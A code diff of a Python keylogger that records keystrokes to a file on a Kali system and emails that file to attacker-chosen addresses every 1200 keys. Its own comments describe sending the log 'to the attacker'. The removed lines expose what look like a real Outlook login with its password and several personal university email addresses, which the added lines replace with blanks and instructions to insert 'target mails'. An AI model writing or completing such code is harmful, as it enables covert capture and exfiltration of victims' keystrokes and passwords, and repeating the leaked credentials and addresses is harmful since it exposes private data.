@@ -16,12 +16,14 @@ def mail_it():
 
 	import os
 
-	mail = "idkmyname791@outlook.com"
-	password = "alibadami0791"
-	# can also implement other arguments [target2@mail.com,target1@mail.com]
-
+	#use your outlook mail here because of the of this code is outlook
+	mail = "************@outlook.com"
+	password = ""
+	
+	
+	# give your target mails here where the keys should be send[target2@mail.com,target1@mail.com]
 	#destination mails where keys would send
-	destination_mail = ["k213610@nu.edu.pk" , "k214755@nu.edu.pk","k214771@nu.edu.pk"]
+	destination_mail = ["","",""]
 	path = "/home/kali/Documents/keyslogging.txt"
 
 	#creating message
@@ -57,8 +59,8 @@ def on_press(key):
 	#global counter is initialized which counts the keys
 	global counter
 	counter += 1
-	#on pressing when the limit reaches to 100 keys it would mail the txt file to the attacker
-	if counter % 100 == 0:
+	#on pressing when the limit reaches to 1200 keys it would mail the txt file to the attacker
+	if counter % 1200 == 0:
 		mail_it()
 
 
